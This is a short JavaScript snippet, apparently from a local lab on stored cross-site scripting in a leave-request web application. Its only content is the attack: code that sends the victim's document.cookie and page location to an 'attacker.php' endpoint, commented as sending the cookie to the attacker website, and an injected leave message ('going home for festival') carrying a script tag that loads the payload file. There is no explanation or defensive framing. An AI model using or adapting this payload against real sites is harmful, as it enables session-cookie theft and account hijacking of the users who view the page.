xhr = new XMLHttpRequest();
xhr.open("GET", "http://localhost/leave/php/attacker.php?cookie=" + document.cookie + "&location=" + document.location, true); //send cookie to attacker website
xhr.send();
//going home for festival <script src="http://localhost/leave/js/xss.js"></script>